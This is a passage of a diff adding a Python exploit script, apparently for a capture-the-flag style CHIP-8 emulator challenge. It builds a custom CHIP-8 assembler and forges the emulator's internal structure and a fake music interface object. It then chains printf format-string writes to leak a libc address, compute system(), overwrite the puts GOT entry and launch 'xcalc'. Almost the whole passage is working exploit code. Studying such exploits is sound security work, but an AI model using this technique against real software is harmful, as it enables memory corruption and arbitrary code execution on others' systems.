+    <span class="k">def</span> <span class="nf">bitwise_shr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x8006</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x8004</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span>
+    
+    <span class="k">def</span> <span class="nf">mov</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x8000</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">skip_eq</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">nn</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_nn</span><span class="p">(</span><span class="n">nn</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x3000</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">nn</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">skip_neq</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">nn</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_x</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_nn</span><span class="p">(</span><span class="n">nn</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_increment_pc</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">code</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_pack_opcode</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">nn</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">seek_pc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">seeked_pc</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">_validate_addr</span><span class="p">(</span><span class="n">seeked_pc</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="n">seeked_pc</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">pc</span>
+        <span class="k">assert</span> <span class="n">seeked_pc</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">((</span><span class="n">seeked_pc</span><span class="o">-</span><span class="bp">self</span><span class="p">.</span><span class="n">pc</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">nop</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">seeked_pc</span>
+
+    <span class="k">def</span> <span class="nf">label</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="k">assert</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">labels</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">labels</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">pc</span>
+
+    <span class="k">def</span> <span class="nf">jump_label</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">label</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">patches</span><span class="p">.</span><span class="n">append</span><span class="p">({</span>
+            <span class="s">"offset"</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">code</span><span class="p">),</span>
+            <span class="s">"label"</span><span class="p">:</span> <span class="n">label</span>
+        <span class="p">})</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">jump</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span>
+    
+    <span class="c1"># higher level primitives
+</span>    <span class="k">def</span> <span class="nf">nop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">jump</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">load_dword_le</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">load_vx</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">store_dword_le</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="c1"># computes twos complement of V0-V7 and stores back there
+</span>    <span class="k">def</span> <span class="nf">two_complement</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># to compute the NOT we XOR with 0xff
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">bitwise_xor</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+
+        <span class="c1"># then add 1
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mh">0xf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">)</span>
+    
+    <span class="c1"># adds the immediate qword to V0-V3
+</span>    <span class="k">def</span> <span class="nf">add_dwords_le_imm</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">imm</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="n">imm</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+            <span class="c1"># compute carriage
+</span>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+                <span class="bp">self</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_qword_le</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">qword</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">qword</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_bytes_continue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> 
+
+    <span class="k">def</span> <span class="nf">native_call_primitive</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">address</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">write_qword_le</span><span class="p">(</span><span class="n">PLAY_CHIP_ADDR</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">set_sound</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">nop</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">assemble</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">patch</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">patches</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">patch</span><span class="p">[</span><span class="s">"label"</span><span class="p">]</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">labels</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span>
+            <span class="n">addr</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">labels</span><span class="p">[</span><span class="n">patch</span><span class="p">[</span><span class="s">"label"</span><span class="p">]]</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">code</span><span class="p">[</span><span class="n">patch</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span>  <span class="p">]</span> <span class="o">|=</span> <span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">code</span><span class="p">[</span><span class="n">patch</span><span class="p">[</span><span class="s">"offset"</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">|=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">code</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Placing fake music interface object at address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s"> (chip8 addr </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">INTERFACE_ADDR</span> <span class="o">-</span> <span class="n">CHIP_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Execution starts at pc = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leak buffer at vm address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">PRINTF_LEAK_OFFSET</span><span class="p">)</span><span class="si">}</span><span class="s">, address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">PRINTF_LEAK_ADDR</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">asm</span> <span class="o">=</span> <span class="n">Asm</span><span class="p">()</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">store_vx</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">jump</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">seek_pc</span><span class="p">(</span><span class="mh">0x222</span><span class="p">)</span>
+    <span class="c1"># at this point the machine is 'booted': profit
+</span>
+    <span class="c1"># initialize puts got
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"pwning...</span><span class="se">\n\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span>
+
+    <span class="c1"># write on a specific location on the stack an address pointing to the chip8 memory
+</span>    <span class="c1"># in particular let me use address PRINTF_LEAK_OFFSET which corresponds to PRINTF_LEAK_ADDR
+</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">PRINTF_LEAK_ADDR</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"c%6$ln</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%*15$c%49$ln</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_dword_le</span><span class="p">(</span><span class="n">PRINTF_LEAK_OFFSET</span><span class="p">)</span>
+    
+    <span class="n">asm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">load_vx_imm</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">bitwise_and</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">skip_neq</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">skip_eq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">)</span>
+    <span class="c1"># should do two's complement 
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">jump_label</span><span class="p">(</span><span class="s">"do_two_complement"</span><span class="p">)</span>
+    <span class="c1"># should not do two's complement
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">jump_label</span><span class="p">(</span><span class="s">"done"</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="s">"do_two_complement"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">two_complement</span><span class="p">()</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="s">"done"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">add_dwords_le_imm</span><span class="p">(</span><span class="n">LEAK_SYSTEM_OFFSET</span><span class="p">)</span>
+    <span class="c1"># for debug
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">store_dword_le</span><span class="p">(</span><span class="n">PRINTF_LEAK_OFFSET</span><span class="p">)</span>
+
+    <span class="c1"># move them to not interfere with the write_bytes_continue
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="mh">0x9</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="mh">0xa</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="mh">0xb</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">mov</span><span class="p">(</span><span class="mh">0xc</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+        <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">PUTS_GOT_ADDR</span> <span class="o">+</span> <span class="n">s</span> <span class="o">*</span> <span class="mi">2</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"c%7$ln</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+
+        <span class="n">asm</span><span class="p">.</span><span class="n">set_index</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">byt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+                <span class="n">exponent</span> <span class="o">=</span> <span class="n">bit</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">byt</span>
+                <span class="n">power</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">exponent</span><span class="p">)</span>
+
+                <span class="n">asm</span><span class="p">.</span><span class="n">bitwise_shr</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">s</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">byt</span><span class="p">,</span> <span class="mi">9</span> <span class="o">+</span> <span class="n">s</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">byt</span><span class="p">)</span>
+                <span class="n">asm</span><span class="p">.</span><span class="n">skip_eq</span><span class="p">(</span><span class="mh">0xf</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="n">asm</span><span class="p">.</span><span class="n">jump_label</span><span class="p">(</span><span class="sa">f</span><span class="s">"continue_s</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">_byte</span><span class="si">{</span><span class="n">byt</span><span class="si">}</span><span class="s">_bit</span><span class="si">{</span><span class="n">bit</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+                <span class="n">format_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%1$"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">power</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"c"</span>
+                <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes_continue</span><span class="p">(</span><span class="n">format_string</span><span class="p">)</span>
+
+                <span class="n">asm</span><span class="p">.</span><span class="n">label</span><span class="p">(</span><span class="sa">f</span><span class="s">"continue_s</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">_byte</span><span class="si">{</span><span class="n">byt</span><span class="si">}</span><span class="s">_bit</span><span class="si">{</span><span class="n">bit</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+        <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes_continue</span><span class="p">(</span><span class="sa">b</span><span class="s">"%14$hn</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PRINTF_PLT</span><span class="p">)</span>
+
+    <span class="n">asm</span><span class="p">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"xcalc</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">native_call_primitive</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span>
+
+    <span class="c1"># more booting code
+</span>    <span class="n">asm</span><span class="p">.</span><span class="n">seek_pc</span><span class="p">(((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span>
+    <span class="n">asm</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
+
+    <span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">.</span><span class="n">assemble</span><span class="p">()</span>
+
+    <span class="n">forged_chip_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">PC_OFFSET</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p16</span><span class="p">((</span><span class="n">FAKE_MUSIC_ADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># forged pc
+</span>    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">SP_OFFSET</span> <span class="o">-</span> <span class="n">PC_OFFSET</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="n">forged_chip_struct</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p8</span><span class="p">(</span><span class="n">SP_VALUE</span><span class="p">)</span> <span class="c1"># forged sp
+</span>    <span class="n">forged_chip_struct</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">forged_chip_struct</span><span class="p">,</span> <span class="n">CHIP_STRUCT_SIZE</span> <span class="o">-</span> <span class="n">ROM_START_OFFSET</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
